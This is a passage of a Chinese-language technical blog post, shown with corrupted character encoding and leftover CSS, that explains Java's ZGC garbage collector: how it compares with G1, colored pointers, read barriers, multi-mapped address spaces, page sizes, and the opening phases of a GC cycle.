ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åŸæ–‡é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lystran.com%2Fposts%2Fbackend%2Fjvm%2Fjvm-zgc%3Futm_source%3Djuejin%26utm_medium%3Dwebsite" target="_blank" title="https://www.lystran.com/posts/backend/jvm/jvm-zgc?utm_source=juejin&amp;utm_medium=website" ref="nofollow noopener noreferrer">GCæ€§èƒ½ä¹‹ç‹ï¼šZGCï¼ˆå«åˆ†ä»£ZGCè§£é‡Šï¼‰</a></p>
<p>æ„Ÿè°¢æ”¯æŒ</p>
</blockquote>
<h2 data-id="heading-0">æ¦‚è®º</h2>
<p>æœ¬æ–‡éœ€è¦è¯»è€…å¯¹Java GCæœ‰åŸºæœ¬çš„è®¤è¯†ï¼ŒåŒæ—¶æœ¬æ–‡ä¼šå¤šæ¬¡ä¸<strong>G1</strong>åƒåœ¾å›æ”¶å™¨è¿›è¡Œå¯¹æ¯”ï¼Œä¾¿äºç†è§£</p>
<p>åœ¨JDK21ä¸­æ¨å‡ºäº†åˆ†ä»£zgcï¼Œç›¸å¯¹äºä¸åˆ†ä»£zgcï¼Œè¿›ä¸€æ­¥æå‡äº†ååé‡ï¼Œä¸”cpuç®—åŠ›ä½¿ç”¨æ•ˆç‡æ›´é«˜ï¼Œæœ¬æ–‡<strong>å…ˆè¿›è¡Œä¸åˆ†ä»£zgcçš„è§£é‡Š</strong>ï¼Œç„¶åè§£é‡Šåˆ†ä»£zgcï¼ˆåŸºæœ¬åŸç†ç›¸åŒï¼‰ã€‚</p>
<h3 data-id="heading-1">ç‰¹ç‚¹</h3>
<ul>
<li>åœé¡¿æ—¶é—´ï¼ˆSTWï¼‰ä¸è¶…è¿‡10ms</li>
<li>å †çš„å¤§å°å’Œæ´»è·ƒå¯¹è±¡çš„å¤§å°å¯¹åœé¡¿æ—¶é—´å½±å“ä¸å¤§</li>
<li>æ”¯æŒæœ€å¤§16TBçš„å†…å­˜ï¼ˆjdk15ï¼‰</li>
</ul>
<p>ç”±ä¸Šå¯çŸ¥ï¼ŒZGCé€‚åˆ <strong>å¤§å†…å­˜ä½å»¶è¿Ÿ</strong> æœåŠ¡çš„å†…å­˜ç®¡ç†å’Œå›æ”¶</p>
<h3 data-id="heading-2">ä¸»è¦è§£å†³çš„ç—›ç‚¹</h3>
<h4 data-id="heading-3">1. åœé¡¿æ—¶é—´é•¿</h4>
<p>åœ¨ZGCä¹‹å‰ï¼Œjdké»˜è®¤ä½¿ç”¨<strong>G1</strong>å›æ”¶å™¨ï¼ŒG1å›æ”¶å™¨ä½¿ç”¨<strong>æ ‡è®°-å¤åˆ¶ç®—æ³•</strong>ï¼Œåœ¨å›æ”¶é˜¶æ®µï¼ˆå¤åˆ¶é˜¶æ®µï¼‰ä¼šæš‚åœæ‰€æœ‰çš„åº”ç”¨çº¿ç¨‹ï¼ˆSTWï¼‰ï¼Œå¤åˆ¶å®Œå­˜æ´»å¯¹è±¡ä¹‹åå†æ¢å¤çº¿ç¨‹ï¼ˆè™½ç„¶ä¸€èˆ¬g1ä¼šä¸ºäº†ä¿è¯ä¸€æ¬¡çš„STWæ—¶é—´æ¯”è¾ƒå°ï¼Œä¼šåˆ†å¤šæ¬¡STWæ¥å¯¹å¯¹è±¡è¿›è¡Œå¤åˆ¶ï¼Œä½†æ˜¯æ€»çš„STWæ—¶é—´æ˜¯å·®ä¸å¤šçš„ï¼‰ï¼Œè¿™åœ¨<strong>å †çš„å¤§å°éå¸¸å¤§</strong>çš„æƒ…å†µä¸‹æ—¶è€—æ—¶éå¸¸é«˜ï¼Œä¼šæœ‰è¾ƒé•¿çš„åœé¡¿æ—¶é—´ï¼Œæ­¤æ—¶ç”¨æˆ·çš„æ„Ÿè§‰å°±æ˜¯ç³»ç»Ÿæ­»æœºäº†ä¸€å°æ®µæ—¶é—´ã€‚</p>
<blockquote>
<p><strong>å¤åˆ¶ç®—æ³•</strong>ä¸­çš„è½¬ç§»é˜¶æ®µéœ€è¦åˆ†é…æ–°å†…å­˜å’Œå¤åˆ¶å¯¹è±¡çš„æˆå‘˜å˜é‡</p>
</blockquote>
<p>è€Œä¸”G1çš„<strong>å†æ ‡è®°é˜¶æ®µ</strong>ï¼ˆé‡æ–°æ ‡è®°é‚£äº›åœ¨å¹¶å‘æ ‡è®°é˜¶æ®µå‘ç”Ÿå˜åŒ–çš„å¯¹è±¡ï¼‰ä¹Ÿæ˜¯STWçš„ï¼Œè¿™ä¸ªåœé¡¿æ—¶é—´ä¹Ÿæ˜¯å’Œå †çš„å¤§å°æœ‰å…³ç³»çš„ï¼Œä½†æ˜¯ä¸»è¦çš„åœé¡¿æ—¶é—´è¿˜æ˜¯æ¥æºäº<strong>å›æ”¶é˜¶æ®µ</strong>ã€‚</p>
<p><strong>ZGC çš„è§£æ³•</strong>ï¼š<strong>å¹¶å‘è½¬ç§»</strong></p>
<ul>
<li>ZGCè¿›è¡Œè½¬ç§»å’Œåº”ç”¨çº¿ç¨‹æ˜¯å¹¶å‘çš„</li>
<li><strong>ç»“æœ</strong>ï¼šZGC çš„ STW æ—¶é—´è·Ÿ<strong>å †çš„å¤§å°</strong>ã€<strong>å­˜æ´»å¯¹è±¡çš„æ•°é‡</strong>å‡ ä¹æ— å…³ï¼Œåªè·Ÿ<strong>æ ¹èŠ‚ç‚¹ï¼ˆGC Rootsï¼‰çš„æ•°é‡</strong>æœ‰å…³ã€‚æ‰€ä»¥ä¸ç®¡å †æ˜¯ 10GB è¿˜æ˜¯ 10TBï¼Œåœé¡¿éƒ½æ˜¯å¸¸æ•°çº§çš„ã€‚</li>
</ul>
<h4 data-id="heading-4">2. ä¸å¯é¢„æµ‹æ€§</h4>
<p>G1 çš„â€œä¸å¯é¢„æµ‹æ€§â€éšç€å †å˜å¤§è€Œæ¶åŒ–</p>
<p>G1 çš„ç›®æ ‡æ˜¯â€œå¯é¢„æµ‹åœé¡¿â€ï¼ˆæ¯”å¦‚è®¾ç½® <code>-XX:MaxGCPauseMillis=200</code>ï¼‰ã€‚
G1 ä¼šå°½åŠ›å»æ»¡è¶³è¿™ä¸ªç›®æ ‡ï¼Œå®ƒä¼šè®¡ç®—ï¼šâ€œä¸ºäº†ä¸è¶…è¿‡ 200msï¼Œæˆ‘è¿™æ¬¡åªèƒ½å›æ”¶ 5 ä¸ª Regionã€‚â€</p>
<ul>
<li><strong>G1 çš„ç—›ç‚¹</strong>ï¼šå½“å †å¤§åˆ°ä¸€å®šç¨‹åº¦ï¼Œæˆ–è€…å†…å­˜ç¢ç‰‡åŒ–ä¸¥é‡æ—¶ï¼ŒG1 å¸¸å¸¸â€œ<strong>é£Ÿè¨€</strong>â€ã€‚
<ul>
<li>ä¸ºäº†ä¸ OOMï¼ˆå†…å­˜æº¢å‡ºï¼‰ï¼ŒG1 æœ‰æ—¶è¢«è¿«è§¦å‘Â <strong>Full GC</strong>ã€‚</li>
<li>G1 çš„ Full GC ä»¥å‰æ˜¯å•çº¿ç¨‹çš„ï¼ˆåæ¥æ”¹æˆäº†å¤šçº¿ç¨‹ï¼‰ï¼Œä½†ä¾ç„¶æ˜¯<strong>å…¨å † STW</strong>ã€‚é‚£åœé¡¿æ—¶é—´å°±æ˜¯ç¾éš¾çº§çš„ã€‚</li>
</ul>
</li>
<li><strong>ZGC çš„è§£æ³•</strong>ï¼š<strong>O(1) å¤æ‚åº¦çš„åœé¡¿</strong>ã€‚
<ul>
<li>ZGC å½»åº•è§£è€¦äº†â€œåœé¡¿æ—¶é—´â€å’Œâ€œå †å¤§å°â€çš„å…³ç³»ã€‚</li>
<li>é€šè¿‡<strong>å¹¶å‘è½¬ç§»</strong>ç›´æ¥é¿å…äº†è¿™ç§æƒ…å†µï¼šæ— é¡»å¯¹åœé¡¿è¿›è¡Œé¢„æµ‹ï¼Œå› ä¸ºæ ¹æœ¬æ— é¡»è¿›è¡ŒSTW</li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">å…³é”®æŠ€æœ¯</h2>
<p>ZGCé€šè¿‡<strong>ç€è‰²æŒ‡é’ˆ</strong>å’Œ<strong>è¯»å±éšœ</strong>æŠ€æœ¯ï¼Œè§£å†³äº†è½¬ç§»è¿‡ç¨‹ä¸­<strong>å‡†ç¡®è®¿é—®å¯¹è±¡</strong>çš„é—®é¢˜ï¼Œå®ç°äº†<strong>å¹¶å‘è½¬ç§»</strong>ã€‚</p>
<p>å¹¶å‘è½¬ç§»éœ€è¦åº”å¯¹çš„é—®é¢˜ï¼šGCçº¿ç¨‹åœ¨è½¬ç§»å¯¹è±¡çš„è¿‡ç¨‹ä¸­ï¼Œåº”ç”¨çº¿ç¨‹ä¹Ÿåœ¨ä¸åœåœ°è®¿é—®å¯¹è±¡ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡è¢«è½¬ç§»äº†ï¼Œä½†æ˜¯å¯¹è±¡åœ°å€è¿˜æœªæ¥å¾—åŠæ›´æ–°ï¼Œå¦‚ä½•ä¿è¯åº”ç”¨çº¿ç¨‹èƒ½å¤Ÿå‡†ç¡®è®¿é—®åˆ°æ­£ç¡®çš„å¯¹è±¡åœ°å€è€Œä¸æ˜¯è¿™ä¸ªæ—§åœ°å€ï¼Ÿ</p>
<p>åœ¨ZGCä¸­ï¼Œåº”ç”¨çº¿ç¨‹è®¿é—®å¯¹è±¡å°†è§¦å‘â€œ<strong>è¯»å±éšœ</strong>â€ï¼Œå¦‚æœå‘ç°å¯¹è±¡è¢«ç§»åŠ¨äº†ï¼Œè¯»å±éšœä¼šæŠŠè¯»å‡ºæ¥çš„æŒ‡é’ˆæ›´æ–°åˆ°å¯¹è±¡çš„æ–°åœ°å€ä¸Šï¼Œè¿™æ ·è®¿é—®åˆ°çš„å°±æ˜¯æ­£ç¡®çš„å¯¹è±¡åœ°å€äº†ã€‚</p>
<p>ä½†æ˜¯JVMæ˜¯å¦‚ä½•åˆ¤æ–­å¯¹è±¡è¢«ç§»åŠ¨è¿‡å‘¢ï¼Ÿå°±æ˜¯åˆ©ç”¨å¯¹è±¡å¼•ç”¨çš„åœ°å€ï¼Œå³<strong>ç€è‰²æŒ‡é’ˆ</strong>ã€‚</p>
<blockquote>
<p>ç€è‰²æŒ‡é’ˆå¯¹åº”è®¡ç®—æœºç§‘å­¦ä¸­çš„ <strong>æ ‡ç­¾æŒ‡é’ˆ Tagged Pointers</strong> è¿™ä¸ªæ¦‚å¿µ
è¿™ä¸ªæŠ€æœ¯çš„ç‰©ç†åŸºç¡€åœ¨äºï¼š<strong>ç°ä»£ CPU çš„ 64 ä½åœ°å€ç©ºé—´å¹¶æ²¡æœ‰è¢«å®Œå…¨åˆ©ç”¨ã€‚</strong>
64 ä½æŒ‡é’ˆå¯ä»¥å¯»å€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>64</mn></msup></mrow><annotation encoding="application/x-tex">2^{64}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">64</span></span></span></span></span></span></span></span></span></span></span></span></span> ä¸ªå­—èŠ‚ï¼ˆ16 EBï¼‰ï¼Œè¿™å¤§å¾—æƒŠäººï¼›é€šå¸¸åªä½¿ç”¨äº†ä½ 48 ä½æ¥ä½œä¸ºå®é™…çš„å†…å­˜åœ°å€ï¼ˆæ”¯æŒ 256TB å†…å­˜ï¼‰ï¼Œ<strong>é«˜ 16 ä½æ˜¯é—²ç½®çš„</strong>
æ—¢ç„¶é«˜ 16 ä½ç©ºç€ä¹Ÿæ˜¯ç©ºç€ï¼Œæˆ‘èƒ½ä¸èƒ½åœ¨é‡Œé¢å­˜ç‚¹ç§è´§ï¼Ÿ è¿™å°±æ˜¯â€œæŸ“è‰²æŒ‡é’ˆ/å¸¦æ ‡ç­¾æŒ‡é’ˆâ€çš„ç”±æ¥â€”â€”<strong>åˆ©ç”¨æŒ‡é’ˆä¸­æœªä½¿ç”¨çš„ä½ï¼ˆBitsï¼‰æ¥å­˜å‚¨é¢å¤–çš„å…ƒæ•°æ®ã€‚</strong></p>
</blockquote>
<p>ZGCå®é™…ä»…ä½¿ç”¨64ä½åœ°å€ç©ºé—´çš„ç¬¬041ä½ï¼Œè€Œç¬¬4245ä½å­˜å‚¨å…ƒæ•°æ®ï¼Œç¬¬47~63ä½å›ºå®šä¸º0ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e07282fde8d468db8dcb2a1205e5301~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHlzdHJhbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770202178&amp;x-signature=VA5ZCDphsQNpSqM1ChiNh%2B1zj%2Fc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">ç€è‰²æŒ‡é’ˆ</h3>
<p>ZGCä»…æ”¯æŒ64ä½ç³»ç»Ÿï¼Œå®ƒæŠŠ64ä½<strong>è™šæ‹Ÿåœ°å€ç©ºé—´</strong>åˆ’åˆ†ä¸ºå¤šä¸ªå­ç©ºé—´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7dfe0200c9f64113b7e81f30fb444a7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHlzdHJhbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770202178&amp;x-signature=6GfGGy773%2BBTCke%2FjBp97HYGBiA%3D" alt="image.png" loading="lazy"/></p>
<p>å…¶ä¸­ï¼Œ[0~4TB) å¯¹åº”Javaå †ï¼Œ[4TB ~ 8TB) ç§°ä¸ºM0åœ°å€ç©ºé—´ï¼Œ[8TB ~ 12TB) ç§°ä¸ºM1åœ°å€ç©ºé—´ï¼Œ[12TB ~ 16TB) é¢„ç•™æœªä½¿ç”¨ï¼Œ[16TB ~ 20TB) ç§°ä¸ºRemappedç©ºé—´ã€‚</p>
<p>å½“åº”ç”¨ç¨‹åºåˆ›å»ºå¯¹è±¡æ—¶ï¼Œé¦–å…ˆåœ¨<strong>å †ç©ºé—´</strong>ç”³è¯·ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œä½†è¯¥è™šæ‹Ÿåœ°å€å¹¶ä¸ä¼šæ˜ å°„åˆ°çœŸæ­£çš„ç‰©ç†åœ°å€ã€‚ZGCåŒæ—¶ä¼šä¸ºè¯¥å¯¹è±¡åœ¨M0ã€M1å’ŒRemappedåœ°å€ç©ºé—´åˆ†åˆ«ç”³è¯·ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œä¸”è¿™ä¸‰ä¸ªè™šæ‹Ÿåœ°å€å¯¹åº”<strong>åŒä¸€ä¸ªç‰©ç†åœ°å€</strong>ï¼Œä½†è¿™ä¸‰ä¸ªç©ºé—´åœ¨<strong>åŒä¸€æ—¶é—´</strong>æœ‰ä¸”åªæœ‰ä¸€ä¸ªç©ºé—´æœ‰æ•ˆã€‚è¿™æ˜¯ZGCä¸­ç»å…¸çš„<strong>ä»¥ç©ºé—´æ¢æ—¶é—´</strong>çš„åšæ³•ã€‚</p>
<p>è®¾ç½® M0ã€M1 è¿™ä¸¤ä¸ªçŠ¶æ€ï¼Œæ˜¯ä¸ºäº†è§£å†³ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š<strong>å¦‚ä½•åœ¨ä¸æš‚åœæ‰€æœ‰çº¿ç¨‹çš„æƒ…å†µä¸‹ï¼ŒåŒºåˆ†â€œè¿™ä¸€è½® GC æ ‡è®°è¿‡çš„å¯¹è±¡â€å’Œâ€œä¸Šä¸€è½® GC ç•™ä¸‹çš„æ—§æ ‡è®°â€ï¼Ÿ</strong>ã€‚ZGCä¼šæœ‰ä¸€ä¸ªå…¨å±€å˜é‡å­˜å‚¨å½“å‰GCè½®æ¬¡çš„æœ‰æ•ˆæ ‡è®°ï¼ˆM0æˆ–M1ï¼‰ï¼Œæ¯è½®<strong>æ ‡è®°é˜¶æ®µ</strong>ä¸­è¿™ä¸ªå˜é‡éƒ½ä¼šåœ¨M0å’ŒM1ä¹‹é—´åˆ‡æ¢ï¼Œå½“åœ¨ä¸ºM1çš„è½®æ¬¡ä¸­è®¿é—®äº†M0çš„åœ°å€ï¼Œå°±è¯´æ˜è¿™æ˜¯ä¸Šä¸€è½®GCçš„æ—§æ ‡è®°ï¼Œéœ€è¦è¿›è¡Œä¸€ç³»åˆ—æ›´æ–°æ“ä½œï¼ˆåæ–‡è®²ï¼‰</p>
<p>è®¾ç½®Remappedæ˜¯ä¸ºäº†è¡¨ç¤ºâ€œ<strong>åœ°å€å·²æ›´æ–°ï¼ˆæ— éœ€æ›´æ–°ï¼‰</strong>â€ã€‚å°†æŒ‡é’ˆæ”¹ä¸ºRemappedæ ‡è®°è¿™ä¸ªåŠ¨ä½œå‘ç”Ÿåœ¨<strong>å¹¶å‘è½¬ç§»</strong>é˜¶æ®µï¼Œçº¿ç¨‹æ¯æ¬ä¸€ä¸ªå¯¹è±¡å°±ä¼šåœ¨æ¬å®Œåå°†æŒ‡é’ˆæ”¹ä¸ºRemappedï¼Œä¸‹ä¸€æ¬¡é‡åˆ°å°±æ— é¡»å†æ¬äº†ã€‚</p>
<blockquote>
<p>å¦å¤–ï¼šå½“M0/M1é˜¶æ®µé‡åˆ°RemappedæŒ‡é’ˆï¼Œä¼šè¿›è¡Œæ›´æ–°ï¼Œæ›´æ–°ä¸ºM0/M1,è¡¨ç¤ºè¿™ä¸ªå¯¹è±¡æ˜¯å­˜æ´»çš„ï¼Œåªè¦ç†è§£ï¼šâ€œæ ‡è®°é˜¶æ®µçš„ä»»åŠ¡æ˜¯æ ‡è®°å¯¹è±¡å­˜æ´»ï¼Œä¼šå°†å¯¹è±¡æ ‡è®°æ›´æ–°ä¸ºå½“å‰çš„åˆæ³•æ ‡è®°ï¼ŒåŒæ—¶è¿›è¡Œæ›´æ–°ä»»åŠ¡â€å°±è¡Œ</p>
</blockquote>
<blockquote>
<p><em>æ³¨ï¼šæ­¤å¤„æè¿°çš„æ˜¯ ZGC ç»å…¸çš„åŸºäºå¤šé‡æ˜ å°„çš„å®ç°ï¼ŒJDK 21 çš„åˆ†ä»£ ZGC å¯¹æ­¤è¿›è¡Œäº†åº•å±‚æ¶æ„å±‚é¢çš„é‡æ„ï¼Œè¯¦è§åæ–‡â€˜åˆ†ä»£ ZGCâ€™ç« èŠ‚ã€‚</em></p>
</blockquote>
<h2 data-id="heading-7">åŸºæœ¬åŸç†</h2>
<p>ZGCå¯¹<strong>æ ‡è®°-å¤åˆ¶ç®—æ³•</strong>è¿›è¡Œäº†é‡å¤§æ”¹è¿›ï¼šåœ¨<strong>æ ‡è®°</strong>ã€<strong>è½¬ç§»</strong>å’Œ<strong>é‡å®šä½é˜¶æ®µ</strong>å‡ ä¹éƒ½æ˜¯<strong>å¹¶å‘</strong>çš„ï¼Œè¿™æ˜¯ZGCå®ç°åœé¡¿æ—¶é—´å°äº10msç›®æ ‡çš„æœ€å…³é”®åŸå› ã€‚</p>
<p>ZGCåƒåœ¾å›æ”¶å‘¨æœŸå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40b870105db748d6b6a902ee864304db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHlzdHJhbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770202178&amp;x-signature=pHrwiA7w50AMBmj2w17suP1prKE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">ZGCå†…å­˜ç»“æ„</h3>
<p>å¯¹äºG1å›ºå®šå¤§å°çš„regionï¼Œä¼šæœ‰å†…å­˜ç¢ç‰‡çš„é—®é¢˜ï¼Œè€Œä¸”å¯¹äºå¤§å¯¹è±¡è€Œè¨€å°±æ˜¯å™©æ¢¦ï¼ˆéœ€è¦å¤šä¸ªregionæ‹¼å‡‘ï¼Œå·¨å½¢å¯¹è±¡Humongous Regionï¼‰ï¼Œç”šè‡³è¿˜éœ€è¦é€šè¿‡ Full GC æ¥æ¸…ç†å†…å­˜ç¢ç‰‡ï¼ˆæ— æ³•åˆ†é…è¿ç»­çš„Regionç»™å·¨å‹å¯¹è±¡ä½¿ç”¨ï¼‰ã€‚</p>
<p>ZGC æŠ›å¼ƒäº†â€œå›ºå®šå¤§å°â€çš„æ‰§å¿µã€‚å®ƒå¼•å…¥äº† <strong>Pageï¼ˆé¡µé¢ï¼‰</strong> çš„æ¦‚å¿µï¼ˆå…¶å®å°±æ˜¯ Region çš„å˜ä½“ï¼‰ï¼Œä½†æ˜¯å®ƒæ”¯æŒ<strong>ä¸‰ç§å°ºå¯¸</strong>ï¼Œè€Œä¸”æ˜¯<strong>åŠ¨æ€åˆ›å»º</strong>çš„ã€‚</p>
<p>ZGC çš„æ ¸å¿ƒé€»è¾‘æ˜¯ï¼š<strong>â€œå¯¹è±¡å¤šå¤§ï¼Œæˆ‘å°±ç»™ä½ é€ å¤šå¤§çš„ç›’å­ï¼Œç»ä¸å¼ºè¡Œæ‹¼å‡‘ã€‚â€</strong></p>
<p>ZGC çš„ Page åˆ†ä¸ºä¸‰ç±»ï¼š</p>
<h4 data-id="heading-9">A. Small Pageï¼ˆå°é¡µé¢ï¼‰</h4>
<ul>
<li><strong>å®¹é‡</strong>ï¼šå›ºå®šÂ <strong>2MB</strong>ã€‚</li>
<li><strong>é€‚ç”¨å¯¹è±¡</strong>ï¼šå°å‹å¯¹è±¡ï¼ˆSize â‰¤ 256KBï¼‰ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šè¿™é‡Œé¢æŒ¤æ»¡äº†å„ç§å°å¯¹è±¡ï¼Œåˆ©ç”¨ç‡å¾ˆé«˜ã€‚</li>
<li><strong>å æ¯”</strong>ï¼šè¿™æ˜¯æœ€å¸¸ç”¨çš„é¡µé¢ç±»å‹ã€‚</li>
</ul>
<h4 data-id="heading-10">B. Medium Pageï¼ˆä¸­é¡µé¢ï¼‰</h4>
<ul>
<li><strong>å®¹é‡</strong>ï¼šå›ºå®šÂ <strong>32MB</strong>ã€‚</li>
<li><strong>é€‚ç”¨å¯¹è±¡</strong>ï¼šä¸­å‹å¯¹è±¡ï¼ˆ256KB &lt; Size â‰¤ 4MBï¼‰ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šä¸“é—¨ç”¨æ¥å­˜é‚£äº›â€œä¸å¤§ä¸å°â€çš„å¯¹è±¡ï¼Œé¿å…å®ƒä»¬å»æŒ¤å å°é¡µé¢ï¼Œæˆ–è€…æµªè´¹å¤§é¡µé¢ã€‚</li>
</ul>
<h4 data-id="heading-11">C. Large Pageï¼ˆå¤§é¡µé¢ï¼‰â€”â€” åº”å¯¹å·¨å‹å¯¹è±¡</h4>
<ul>
<li><strong>å®¹é‡</strong>ï¼š<strong>åŠ¨æ€å˜åŒ–</strong>ï¼ˆN Ã— 2MBï¼‰ã€‚</li>
<li><strong>é€‚ç”¨å¯¹è±¡</strong>ï¼šå¤§å‹å¯¹è±¡ï¼ˆSize &gt; 4MBï¼‰ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š
<ol>
<li><strong>é‡èº«å®šåš</strong>ï¼šå¦‚æœä½ è¦å­˜ä¸€ä¸ª 7MB çš„å¯¹è±¡ï¼ŒZGC å°±ç»™ä½ åˆ†é…ä¸€ä¸ª 8MBï¼ˆ4 Ã— 2MBï¼‰çš„ Pageã€‚å¦‚æœä½ è¦å­˜ 20MBï¼Œå°±åˆ†é… 20MB çš„ Pageã€‚</li>
<li><strong>ç‹¬äº«</strong>ï¼š<strong>Large Page é‡Œåªèƒ½å­˜ 1 ä¸ªå¯¹è±¡ï¼</strong>Â å®ƒæ˜¯ä¸ºè¿™ä¸ªå¤§å¯¹è±¡ä¸“å±å®šåˆ¶çš„ã€‚</li>
<li><strong>ä¸é‡åˆ†é…</strong>ï¼šåœ¨ GC è¿‡ç¨‹ä¸­ï¼ŒSmall/Medium Page é‡Œçš„å¯¹è±¡ä¼šè¢«æ¬è¿ï¼ˆå¤åˆ¶ï¼‰ï¼Œä½†Â <strong>Large Page é‡Œçš„å¯¹è±¡æ°¸è¿œä¸ä¼šè¢«æ¬è¿</strong>ã€‚ZGC åªæ˜¯ä¿®æ”¹ä¸€ä¸‹é¡µé¢çš„æ˜ å°„å…³ç³»ï¼ˆRemapï¼‰ï¼Œå› ä¸ºæ¬è¿å¤§å¯¹è±¡çš„æˆæœ¬å¤ªé«˜äº†ã€‚</li>
</ol>
</li>
</ul>
<h3 data-id="heading-12">ZGCè¿‡ç¨‹ï¼ˆä¸€ä¸ªGCå‘¨æœŸï¼‰</h3>
<h4 data-id="heading-13">ç¬¬ä¸€æ­¥ï¼šåˆå§‹æ ‡è®° (Pause Mark Start) â€”â€” ã€STWã€‘</h4>
<ul>
<li><strong>å¹²ä»€ä¹ˆ</strong>ï¼šæ ‡è®°Â <strong>æ ¹èŠ‚ç‚¹ï¼ˆGC Rootsï¼‰</strong>Â ç›´æ¥å¼•ç”¨çš„å¯¹è±¡ã€‚</li>
<li><strong>è€—æ—¶</strong>ï¼šæçŸ­ï¼ˆä»…è·Ÿçº¿ç¨‹æ•°é‡å’Œæ ¹èŠ‚ç‚¹æ•°é‡æœ‰å…³ï¼Œä¸å †å¤§å°æ— å…³ï¼‰ã€‚</li>
<li><strong>å…³é”®åŠ¨ä½œ</strong>ï¼šåˆ‡æ¢å…¨å±€è§†å›¾ï¼ˆæ¯”å¦‚ä» Remapped åˆ‡åˆ° M0ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-14">ç¬¬äºŒæ­¥ï¼šå¹¶å‘æ ‡è®° (Concurrent Mark) â€”â€” ã€å¹¶å‘ã€‘</h4>
<ul>
<li><strong>å¹²ä»€ä¹ˆ</strong>ï¼šä»æ ¹èŠ‚ç‚¹å‡ºå‘ï¼Œé¡ºè—¤æ‘¸ç“œéå†æ•´ä¸ªå¯¹è±¡å›¾ï¼Œç»™æ´»å¯¹è±¡â€œæŸ“è‰²â€ï¼ˆæ ‡è®°ä¸ºå½“å‰å…¨å±€è§†å›¾åˆæ³•çš„æ ‡è®°M0/M1, ä»¥åŠåœ¨ä½å›¾ä¸Šæ ‡è®°ï¼‰ã€‚
<blockquote>
<p>ZGCä¸­å­˜åœ¨ä¸€ä¸ª<strong>å…¨å±€çš„Bitmapï¼ˆLive mapï¼‰</strong>ï¼Œç”¨äºæ ‡è®°<strong>æŸä¸ªä½ç½®</strong>æ˜¯å¦å­˜åœ¨å¯¹è±¡ä»¥åŠè¯¥å¯¹è±¡æ˜¯å¦ä¸ºå­˜æ´»çš„ï¼ˆ1ä¸ºå­˜æ´»å¯¹è±¡ï¼Œ0ä¸ºå¯å›æ”¶å¯¹è±¡æˆ–è€…æ— å¯¹è±¡ï¼‰ï¼Œè¿™å¯ä»¥å¤§å¹…åº¦åŠ å¿«zgcå¯»æ‰¾å­˜æ´»å¯¹è±¡çš„æ—¶é—´ï¼ˆæ¯”å¦‚å¹¶å‘è½¬ç§»æ—¶ï¼‰ï¼Œä½†æ˜¯åªåœ¨<strong>å½“å‰gcå‘¨æœŸ</strong>ä¸­æœ‰æ•ˆ</p>
</blockquote>
</li>
